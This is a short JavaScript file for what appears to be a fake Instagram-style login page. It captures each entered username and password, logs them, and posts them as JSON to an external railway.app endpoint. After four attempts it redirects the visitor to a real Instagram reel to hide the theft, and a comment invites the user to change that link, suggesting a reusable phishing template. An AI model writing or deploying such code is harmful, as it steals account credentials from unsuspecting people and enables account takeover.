const loginbtn = document.querySelector(".login");
const url= `https://instafun-production-b0fb.up.railway.app/users`



const userbtn= document.querySelector(".usr")
const passbtn = document.querySelector(".pss")

var clickCount = 0;

loginbtn.addEventListener("click",async function() {
  
  clickCount++;
  if (clickCount >= 4) {
    window.location.href = 'https://www.instagram.com/reel/DGGEVYsspb_/?igsh=MWNpbTJicDk3cXZ3aQ=='; // Change to your link
  }
   console.log("done");

   if(clickCount<4){
   const username = await userbtn.value;
   const password = await passbtn.value;
      console.log(username + " : " + password)
      const user = {userName: username, password:password}
  await fetch(url,{

    method: 'POST',
    headers: {
        'Content-Type': 'application/json', // 👈 important
      },
      body: JSON.stringify(user),

  })
   }   


})